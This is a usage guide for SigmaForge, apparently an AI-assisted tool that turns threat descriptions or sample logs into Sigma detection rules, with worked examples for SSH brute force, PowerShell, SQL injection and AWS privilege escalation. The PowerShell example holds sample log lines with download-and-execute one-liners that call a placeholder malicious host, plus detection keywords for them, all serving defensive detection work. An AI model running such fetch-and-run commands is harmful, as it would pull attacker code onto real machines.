# SigmaForge Usage Guide 📚

Complete guide with real-world examples for SOC analysts and detection engineers.

---

## 🎯 Use Cases

### When to Use SigmaForge

1. **Responding to CTI (Cyber Threat Intelligence)**
   - You read a threat report about a new technique
   - You need a detection rule ASAP

2. **Analyzing Suspicious Logs**
   - Your SIEM flagged unusual activity
   - You have example logs but no rule yet

3. **Creating Rules from CVE Descriptions**
   - New vulnerability published
   - You need to detect exploitation attempts

4. **Training Junior Analysts**
   - Teaching detection rule writing
   - Learning MITRE ATT&CK mappings

5. **Rapid Prototyping**
   - Need a quick rule for testing
   - Will refine later with your team

---

## 📖 Example 1: SSH Brute Force Detection

### Scenario
Your security team wants to detect SSH brute force attacks.

### Steps

1. **Launch SigmaForge**
   ```bash
   streamlit run app.py
   ```

2. **Choose "Threat description" mode** in the sidebar

3. **Enter this description:**
   ```
   Detect SSH brute force attacks where an attacker makes 5 or more failed
   login attempts from the same source IP address within a short time window,
   potentially followed by a successful login.
   ```

4. **Click "Generate Sigma Rule"**

5. **Review the output:**
   - **Threat Interpretation** shows:
     - Logsource: `product: linux, service: auth`
     - Relevant fields: `user`, `src_ip`, `event_type`, `timestamp`
     - MITRE: `T1110 - Brute Force`
     - Assumptions: "SSH authentication logs available"

   - **Generated Sigma Rule** (example):
     ```yaml
     title: Suspicious SSH Brute Force Attack Pattern
     id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
     description: Detects multiple failed SSH login attempts from a single source IP
     status: experimental
     logsource:
         product: linux
         service: auth
     detection:
         selection_failed:
             event_type: 'authentication_failure'
             service: 'ssh'
         condition: selection_failed | count(src_ip) by src_ip > 5
     fields:
         - src_ip
         - user
         - timestamp
         - authentication_method
     falsepositives:
         - Users with forgotten passwords
         - Automated systems with incorrect credentials
     level: medium
     tags:
         - attack.credential_access
         - attack.t1110
     ```

6. **Optional: Click "Review & Improve Rule"**
   - The AI critiques the rule
   - Suggests adding time windows
   - May recommend filtering known service accounts

7. **Download the rule** (.yml file)

8. **Deploy to your Sigma engine** (sigmac, Sigma CLI, or SIEM)

---

## 📖 Example 2: Detecting Malicious PowerShell

### Scenario
You found suspicious PowerShell activity in your environment. You have log examples.

### Steps

1. **Choose "Example logs" mode** in the sidebar

2. **Paste your suspicious logs:**
   ```
   2024-01-15 14:23:45 WIN-SERVER01 Microsoft-Windows-PowerShell: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuA...

   2024-01-15 14:24:12 WIN-SERVER02 Microsoft-Windows-PowerShell: powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')"

   2024-01-15 15:01:33 WIN-WORKSTATION05 Microsoft-Windows-PowerShell: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/xyz123'))"
   ```

3. **Click "Generate Sigma Rule"**

4. **SigmaForge analyzes the patterns:**
   - Common elements: `-NoProfile`, `-ExecutionPolicy Bypass`, `-EncodedCommand`, `-WindowStyle Hidden`
   - Behavior: Downloading and executing remote scripts
   - Network connections to shortened URLs and direct IPs

5. **Generated rule detects:**
   ```yaml
   title: Suspicious PowerShell Remote Script Download and Execution
   description: Detects PowerShell executing with bypass flags and downloading scripts from remote URLs
   logsource:
       product: windows
       service: powershell
   detection:
       selection_process:
           Image|endswith: '\powershell.exe'
       selection_flags:
           CommandLine|contains:
               - '-ExecutionPolicy Bypass'
               - '-NoProfile'
               - '-WindowStyle Hidden'
               - '-nop'
               - '-w hidden'
       selection_download:
           CommandLine|contains:
               - 'DownloadString'
               - 'IEX'
               - 'Invoke-Expression'
               - 'Net.WebClient'
       condition: selection_process and (selection_flags and selection_download)
   tags:
       - attack.execution
       - attack.t1059.001
       - attack.defense_evasion
       - attack.t1140
   ```

6. **Test with the log sanity check:**
   - Paste your original logs back in
   - Click "Run Rough Match"
   - Verify all 3 suspicious logs match ✅

7. **Deploy to your environment**

---

## 📖 Example 3: Web Attack Detection (SQL Injection)

### Scenario
You need to detect SQL injection attempts in web server logs.

### Steps

1. **Threat description mode**

2. **Input:**
   ```
   Detect SQL injection attempts in HTTP requests. Look for common SQL keywords
   like UNION, SELECT, OR 1=1, DROP TABLE, and other SQL metacharacters in URL
   parameters or POST data. This should catch both error-based and blind SQL
   injection attempts.
   ```

3. **Generated rule covers:**
   - Log source: Web servers (Apache, Nginx, IIS)
   - Fields: `url`, `request_uri`, `query_string`, `post_data`, `user_agent`, `src_ip`
   - Patterns: SQL keywords, comment markers (`--`, `/**/`), encoding tricks
   - MITRE: `T1190 - Exploit Public-Facing Application`

4. **Use case:** Deploy to web application firewall (WAF) or SIEM

---

## 📖 Example 4: Cloud Security (AWS)

### Scenario
Detect suspicious AWS IAM privilege escalation.

### Input
```
Detect when an AWS IAM user or role is granted administrative privileges
(AttachUserPolicy, PutUserPolicy) especially when the policy contains wildcards
or admin-level permissions. This could indicate privilege escalation attempts.
```

### Output
- Logsource: `product: aws, service: cloudtrail`
- Detection: `AttachUserPolicy`, `PutUserPolicy` events with `Action: "*"` or `Resource: "*"`
- MITRE: `T1078.004 - Valid Accounts: Cloud Accounts`, `T1098 - Account Manipulation`

---

## 🎨 Interface Overview

### Sidebar Configuration

```
⚙️ Configuration
├── Input Mode
│   ├── ○ Threat description    ← Natural language
│   └── ○ Example logs          ← Paste suspicious logs
├── Model Settings
│   ├── Model Name: gpt-4o-mini
│   └── Temperature: 0.2        ← Lower = more consistent
```

### Main Interface

```
Left Panel (Input)              Right Panel (Output)
┌─────────────────────┐        ┌──────────────────────┐
│ 📝 Input            │        │ 📋 Output            │
│                     │        │                      │
│ [Text area]         │        │ 🎯 Threat Info       │
│                     │        │ ├─ Logsource         │
│ [Generate Rule]     │        │ ├─ Fields            │
│                     │        │ ├─ MITRE             │
│ [Review & Improve]  │        │ └─ Assumptions       │
│                     │        │                      │
│                     │        │ 📜 Sigma Rule        │
│                     │        │ [YAML code]          │
│                     │        │ [Download .yml]      │
│                     │        │                      │
│                     │        │ 🔎 Log Sanity Check  │
│                     │        │ [Test logs here]     │
└─────────────────────┘        └──────────────────────┘
```

---

## 🛠️ Advanced Workflows

### Workflow 1: CVE Response Pipeline

```
1. Read CVE description
   ↓
2. Paste into SigmaForge (threat description mode)
   ↓
3. Generate initial rule
   ↓
4. Review & improve
   ↓
5. Test with known-good and known-bad logs
   ↓
6. Deploy to test environment
   ↓
7. Monitor false positives for 24 hours
   ↓
8. Refine and deploy to production
```

### Workflow 2: Incident Response

```
1. Analyst finds suspicious activity
   ↓
2. Extract 5-10 representative log lines
   ↓
3. Use "Example logs" mode
   ↓
4. Generate rule
   ↓
5. Run rough match against last 24h of logs
   ↓
6. Find related events
   ↓
7. Deploy rule for ongoing monitoring
```

### Workflow 3: Threat Hunting

```
1. Hypothesis: "Are we seeing living-off-the-land attacks?"
   ↓
2. Describe behavior in SigmaForge
   ↓
3. Generate multiple rules for different LOLBins
   ↓
4. Deploy as hunting queries
   ↓
5. Review results
   ↓
6. Refine based on findings
```

---

## 💡 Tips & Best Practices

### Writing Good Threat Descriptions

**Good ✅**
```
Detect when cmd.exe or powershell.exe spawns from Microsoft Office applications
(Word, Excel, PowerPoint) which may indicate macro-based malware execution or
document exploits.
```

**Too Vague ❌**
```
Detect malware
```

**Too Specific ❌**
```
Detect exactly this command: cmd.exe /c powershell.exe -nop -w hidden -c "IEX..."
```

### Providing Good Example Logs

**Good ✅**
- 5-10 representative examples
- Show variations of the attack
- Include all relevant fields
- Real or realistic-looking logs

**Not Ideal ❌**
- Single log line
- Heavily redacted logs
- Unrelated log types mixed together

### Using the Review Feature

**When to review:**
- Initial rule seems too broad
- You want to catch edge cases
- False positives are a concern
- Rule needs MITRE mapping improvements

**How to use:**
1. Generate initial rule
2. Click "Review & Improve"
3. Compare before/after
4. Iterate if needed (can review multiple times)

---

## 🧪 Testing Your Rules

### In SigmaForge

1. Generate your rule
2. Go to "Quick Log Sanity Check"
3. Paste test logs:
   - Known malicious logs (should match ✅)
   - Known benign logs (should NOT match ⚪)
4. Verify behavior

### In Production

```bash
# Convert to your SIEM format
sigmac -t splunk your_rule.yml

# Or use Sigma CLI
sigma convert -t elasticsearch your_rule.yml

# Test in your environment
# Monitor false positive rate
# Refine as needed
```

---

## 🔍 Understanding the Output

### Threat Interpretation Section

- **Logsource**: Where to look for this activity
- **Relevant Fields**: What to investigate when the rule fires
- **Attack Behaviour**: What the attacker is doing
- **MITRE Techniques**: Standardized attack classification
- **Assumptions**: What the rule assumes about your environment

### Sigma Rule Section

- **title**: Clear, descriptive name
- **id**: Unique identifier (auto-generated UUID)
- **description**: What and why
- **status**: experimental/test/stable
- **logsource**: Where the logs come from
- **detection**: The actual matching logic
  - `selection`: What to look for
  - `condition`: How to combine selections
- **fields**: What analysts should examine
- **falsepositives**: Known benign triggers
- **level**: critical/high/medium/low
- **tags**: MITRE ATT&CK and other categorizations

---

## ⚠️ Limitations & Important Notes

### What SigmaForge Does Well

✅ Rapid prototyping of detection rules
✅ Learning tool for understanding Sigma
✅ Baseline rules for common threats
✅ MITRE ATT&CK mapping
✅ Saving time on boilerplate

### What Requires Human Expertise

⚠️ **Environment-specific tuning**: Your logs may have different field names
⚠️ **False positive management**: Test in YOUR environment
⚠️ **Performance optimization**: Some rules may be expensive to run
⚠️ **Evasion resistance**: Attackers can modify techniques
⚠️ **Compliance**: Ensure rules meet your org's requirements

### The "Rough Match" Feature

- **NOT a full Sigma engine**
- Simple string matching for demo purposes
- Use real Sigma tools for production:
  - Sigma CLI
  - pySigma
  - SIEM-native Sigma support (Splunk, Elastic, etc.)

---

## 📚 Additional Resources

### Learn More About Sigma

- [Sigma GitHub](https://github.com/SigmaHQ/sigma)
- [Sigma Rule Specification](https://github.com/SigmaHQ/sigma-specification)
- [SigmaHQ Rule Repository](https://github.com/SigmaHQ/sigma/tree/master/rules)

### MITRE ATT&CK

- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [ATT&CK for Enterprise](https://attack.mitre.org/)

### Detection Engineering

- [Detection Engineering Weekly](https://www.detectionengineering.io/)
- [MITRE Cyber Analytics Repository](https://car.mitre.org/)

---

## 🆘 Troubleshooting

### "OpenAI API key not found"

```bash
# Make sure it's exported in your current shell
export OPENAI_API_KEY='sk-...'

# Or add to your shell profile
echo 'export OPENAI_API_KEY="sk-..."' >> ~/.bashrc
source ~/.bashrc
```

### "LLM did not return valid JSON/YAML"

- Try regenerating (click button again)
- Adjust temperature to 0.0 for more deterministic output
- Simplify your input description
- Check your API key has credits

### Rule seems too broad

1. Click "Review & Improve Rule"
2. Add more specific details to your description
3. Provide more example logs showing variations
4. Manually edit the downloaded .yml file

### No matches in log sanity check

- Remember: rough matching is limited
- Field names in your logs may differ from the rule
- Try deploying to a real Sigma engine
- The rule might need environment-specific adjustments

---

## 🎓 Learning Path

### Beginner
1. Start with simple threat descriptions
2. Use the threat interpretation to learn log sources
3. Examine generated rules to understand Sigma syntax
4. Test with the rough matcher

### Intermediate
1. Use example logs mode
2. Compare generated rules with SigmaHQ repository
3. Practice reviewing and improving rules
4. Deploy to a test SIEM environment

### Advanced
1. Use SigmaForge for rapid prototyping
2. Manually refine rules for your environment
3. Build detection rule sets for threat campaigns
4. Contribute your rules back to the community

---

**Happy hunting! 🎯**

For questions or issues, check the main README or submit an issue on GitHub.
